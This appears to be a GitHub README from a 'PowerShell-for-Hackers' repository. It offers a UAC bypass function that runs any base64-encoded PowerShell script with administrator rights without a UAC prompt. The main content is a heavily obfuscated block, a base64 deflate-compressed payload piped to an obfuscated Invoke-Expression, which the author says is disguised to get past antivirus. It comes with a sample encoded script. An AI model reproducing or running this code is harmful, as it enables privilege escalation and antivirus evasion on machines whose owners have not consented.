![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# UAC Bypass

## Description

This is a bonus function I am including with this repository. It will allow you to run any base64 encoded script from a standard Powershell console regardless
if Admin Privledges are required. It will open an Admin prompt and execute your code bypassing the UAC. In order to get this past the Anti Virus I have to heavily 
obfuscate it. So with that being said you really should not run code if you do not know what it does so user discretion is advised. 

## The Function

### [UAC-Bypass] 

This function has 2 parts. 

You have the ```$code``` variable you can store any base64 encoded script into. 

You can use my [Text to Base64](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/B64.md) function to encode your own scripts.

```
$code = "TgBlAHcALQBJAHQAZQBtACAAQwA6AFwASQB0AC0AVwBvAHIAawBlAGQALgB0AHgAdAA="
```
Next you have a highly obfuscated block of code that will run any Base64 encoded script stored in the ```$code``` variable with Admin rights. 

Using the code above as an example running both of these in a standard non Admin Powershell console will create a file called ```It-Worked.txt``` 

in your C: directory just to show you it works.

```
(New-OBJEct SYsTEm.IO.StReamREADer( (New-OBJEct  iO.COmpREssioN.dEflAtEstrEam([SYStEm.Io.mEMoRYStREAm] [CoNVERT]::fROmBAse64STrING( 'hY6xCsIwFEV/5RG6ph0ci1MHBZEOQacsobmtQtKEvEj9fJuC4FT3e849VX89HUUMCxI/4FyNN0hiHqgaggWJNmEiYy2J86W7aRXGvJgE3TnDDNZ18JNWBdV9xKyH4L2ZraDGUrXKqRn/KTxLRs7PeWLdvdIdaaNFUYvCj8GuBxGp1LUqm5SlckAkyXTY9BYOGbuR4puyv/2t2ZAP'),[sySteM.iO.COmPREsSion.COMprEssIONmODe]::decOMpreSS ) ) , [tExt.eNcODINg]::ascIi)).rEAdToEND( )|& ( $SHELLId[1]+$ShELLid[13]+'X')
```

<p align="right">(<a href="#top">back to top</a>)</p>


<!-- CONTACT -->
## Contact

I am Jakoby
  <p><br/>

  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 

  <a href="https://github.com/I-Am-Jakoby/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>

  <a href="https://www.instagram.com/i_am_jakoby/">
    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
  </a>

  <a href="https://twitter.com/I_Am_Jakoby/">
    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
  </a>

  <a href="https://www.youtube.com/c/IamJakoby/">
    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
  </a>

</p>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
